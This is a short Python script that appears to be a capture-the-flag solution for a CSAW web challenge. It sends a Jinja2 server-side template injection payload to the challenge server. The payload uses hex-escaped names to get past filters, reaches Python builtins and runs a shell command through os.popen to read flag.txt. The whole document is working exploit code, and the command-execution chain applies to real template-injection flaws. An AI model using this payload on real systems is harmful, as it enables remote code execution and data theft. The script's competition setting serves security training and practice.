#!/bin/python3

import requests
import sys
from html import unescape

url = 'http://web.chal.csaw.io:5000/'
payload = "{{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fbuiltins\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5f\\x69mport\\x5f\\x5f')('\\x6fs')|attr('popen')('cat flag.txt')|attr('read')()}}"

def req(payload):
    r = requests.get(url + 'submit?value=' + payload)
    if r.status_code == 200:
        r = unescape(r.text)
    print(r)

if __name__=="__main__":
    if len(sys.argv) > 1:
        req(sys.argv[1])
    else:
        req(payload)
    exit()
